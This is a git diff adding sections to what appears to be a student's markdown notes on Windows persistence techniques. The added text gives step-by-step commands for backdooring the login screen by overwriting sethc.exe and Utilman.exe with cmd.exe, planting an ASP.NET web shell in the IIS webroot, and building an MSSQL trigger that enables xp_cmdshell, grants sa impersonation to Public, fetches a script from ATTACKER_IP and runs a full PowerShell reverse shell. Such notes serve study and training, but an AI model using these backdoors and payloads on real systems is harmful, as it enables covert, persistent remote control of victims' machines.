@@ -272,3 +272,131 @@ One of the things `userinit.exe` does when loading the user profile is check for
 We can create a reverse shell using [msfvenom](../../useful_tools/Linux/README.md#msfvenom) and then using python we can create a quick http server and grab the file onto the host machine. Place the file in a "safe" location such as `C:\Windows\`.
 
 Go into the registry at `HKCU\Environment` and add a REG_EXPAND_SZ with the name `UserInitMprLogonScript` and the data value as the location of your executable.
+
+## Backdooring the Login Screen / RDP
+
+### Sticky Keys
+After hitting `SHIFT` 5 times sticky keys will execute. The binary that it executes is located at 
+
+`C:\Windows\System32\sethc.exe`
+
+We can replace `sethc.exe` with a copy of `cmd.exe`, which would allow us to get a command prompt at the login screen.
+
+First we will need to take ownership of the file and grant our current user permission to modify it.
+
+```
+C:\> takeown /f c:\Windows\System32\sethc.exe
+
+C:\> icacls C:\Windows\System32\sethc.exe /grant <Current User>:F
+
+C:\> copy C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe
+
+# select yes to overwrite
+```
+
+From the lock screen, you should now be able to hit shift 5 times to get a cmd window with SYSTEM privileges!
+
+### Utilman
+This is an Ease of Access program on the lock screen. It's location is:
+
+`C:\Windows\System32\Utilman.exe`
+
+We can follow the same process as with [sticky keys](#sticky-keys), but changing out `sethc.exe` to `Utilman.exe`
+
+```
+C:\> takeown /f c:\Windows\System32\Utilman.exe
+
+C:\> icacls C:\Windows\System32\Utilman.exe /grant <Current User>:F
+
+C:\> copy C:\Windows\System32\cmd.exe C:\Windows\System32\Utilman.exe
+
+# select yes to overwrite
+```
+
+On the lockscreen select the "Ease of Access" button and it will open a cmd prompt with SYSTEM privileges!
+
+## Persisting Through Existing Services
+
+### Using Web Shells
+This method will grant us access to the configured user in IIS which is `iis apppool\defaultapppool`. This is an unprivileged user, but it has `SeImpersonatePrivilege` which can be used to escalate to Administrator.
+
+We need to start by downloading an ASP.NET web shell. -> [here](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmdasp.aspx) 
+
+We then want to move the file into the webroot `C:\inetpub\wwwroot`
+
+#### Potencial Fence
+Depending on how you transfered the webshell it may not have the rights necessary to run. So use the following command:
+
+`icacls <Location of web shell> /grant Everyone:F`
+
+Now you can visit the webpage `http://<host IP>/<name of web shell>` and you should have access!
+
+This method is well known, so more likely it will trigger an alert for the blue team :disappointed:
+
+### Using MSSQL as a Backdoor
+This method abuses triggers (there are many other methods).
+
+We need to start by enabling `xp_cmdshell`, which by default is disabled, but will allow us to run commands on the system.
+
+Open `Microsoft SQL Server Managemtn Studio 18`. Once logged in, select `New Query` and run the following commands:
+
+```
+sp_configure 'Show Advanced Options',1;
+RECONFIGURE;
+GO
+
+sp_configure 'xp_cmdshell',1;
+RECONFIGURE;
+GO
+```
+
+Execute the query.
+
+We must then ensure that any website accessing the database can run xp_cmdshell. By default only `sysadmin` role can do so. We will impersonate the `sa` user, which is the default database administrator.
+
+```
+USE master
+
+GRANT IMPERSONATE ON LOGIN::sa to [Public];
+```
+
+You will then want to switch to the database you want to add the trigger to.
+
+```USE <DB NAME>```
+
+In this example we will be setting the trigger whenever an `INSERT` is made into the `Employees` table of the `HRDB` database:
+
+```
+CREATE TRIGGER [sql_backdoor]
+ON HRDB.dbo.Employees 
+FOR INSERT AS
+
+EXECUTE AS LOGIN = 'sa'
+EXEC master..xp_cmdshell 'Powershell -c "IEX(New-Object net.webclient).downloadstring(''http://ATTACKER_IP:8000/evilscript.ps1'')"';
+```
+
+We then need to set up the `evilscript.ps1`:
+
+```
+$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",4454);
+
+$stream = $client.GetStream();
+[byte[]]$bytes = 0..65535|%{0};
+while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
+    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
+    $sendback = (iex $data 2>&1 | Out-String );
+    $sendback2 = $sendback + "PS " + (pwd).Path + "> ";
+    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
+    $stream.Write($sendbyte,0,$sendbyte.Length);
+    $stream.Flush()
+};
+
+$client.Close()
+```
+
+We will need two terminals open to handle this attack. One for the webserver to serve our `evilscript.ps1` and one to listen for the reverse shell.
+
+1) `python3 -m http.server`
+2) `nc -lnvp 4454`
+
+You will then need to trigger the `INSERT` into the `Employees` table somehow.
